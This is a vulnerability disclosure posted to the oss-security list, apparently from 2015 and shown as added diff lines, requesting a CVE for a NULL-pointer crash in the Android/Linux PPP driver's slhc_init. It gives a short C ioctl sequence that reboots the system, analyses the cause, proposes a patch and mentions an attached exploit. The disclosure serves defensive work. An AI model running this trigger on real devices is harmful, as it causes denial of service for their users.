@@ -1,0 +1,97 @@
+
+Date: Fri, 9 Oct 2015 05:43:12 +0000
+From: 郭永刚 <guoyonggang@....cn>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: CVE request - Android OS - Using the PPP character device driver
+ caused the system to restart
+
+Detailed steps(The code below using C language):
+Step1:     Open PPP drive device.
+      int fd = open("/dev/ppp",O_RDWR);
+
+Step2:     Create a new ppp unit.
+      unsigned int cmd = PPPIOCNEWUNIT;
+      long arg = -1;/* Set arg < 0 */
+      ret = ioctl(fd,cmd, &arg);
+
+Step3:  Set VJ max slot ID.
+      cmd= PPPIOCSMAXCID;
+      arg = 0x67084000;
+      ret = ioctl(fd,cmd, &arg);
+
+Result:
+      System restart.
+
+
+I think the correct behavior should be :
+      return -EINVAL;
+      Tell user not a typewriter.
+
+Analysis of causes:
+In the process of using the PPP device driver, if the unit of the PPP device file has been created. On the basis of the above, the ioctl function is used to pass the PPPIOCSMAXCID command and the 0x67084000  parameter (parameters must be satisfied: arg>>16 > 255 and 0xFFFF&arg > 255), which will lead to the use of null pointers in the kernel.
+The null pointer is used specifically in the slhc_init function, and the function is defined as follows:
+////////////////////////////slhc_init///////////////////////////////////////
+struct slcompress *
+slhc_init(int rslots, int tslots)
+{
+      ......
+      struct slcompress *comp;
+      ......
+
+      if ( rslots > 0  &&  rslots < 256 ) {
+           ......
+           comp->rstate = kzalloc(rsize, GFP_KERNEL);
+           ......
+      }
+
+      if ( tslots > 0  &&  tslots < 256 ) {
+           ......
+           comp->tstate = kzalloc(tsize, GFP_KERNEL);
+           ......
+      }
+
+      ......
+
+      if ( tslots > 0 ) {
+           ts = comp->tstate;
+           for(i = comp->tslot_limit; i > 0; --i){
+                 ts[i].cs_this = i;
+                 ts[i].next = &(ts[i - 1]);
+           }
+           ts[0].next = &(ts[comp->tslot_limit]);
+           ts[0].cs_this = 0;
+      }
+      ......
+}
+
+If you pass the appropriate parameters, make sure tslots and rslots two parameters are greater than 255. This lead comp->rstate equal NULL.In cases no check the comp->rstate is NULL, using it in kernel casue the system crash and restart.
+
+
+
+Solution:
+      Add a judge in front of "ts = comp->tstate;".
+
+      As follows:
+      if ( tslots > 0 ) {
+           if(comp->tstate != NULL){
+                 ts = comp->tstate;
+                 for(i = comp->tslot_limit; i > 0; --i){
+                      ts[i].cs_this = i;
+                      ts[i].next = &(ts[i - 1]);
+                 }
+                 ts[0].next = &(ts[comp->tslot_limit]);
+                 ts[0].cs_this = 0;
+           }else{
+                 return NULL;
+           }
+      }
+
+
+
+
+The specific exploit code and steps caused the system to restart see attachment.
+
+
+Content of type "text/html" skipped
+
+Download attachment "bug_test_reproduce.zip" of type "application/x-zip-compressed" (2554 bytes)
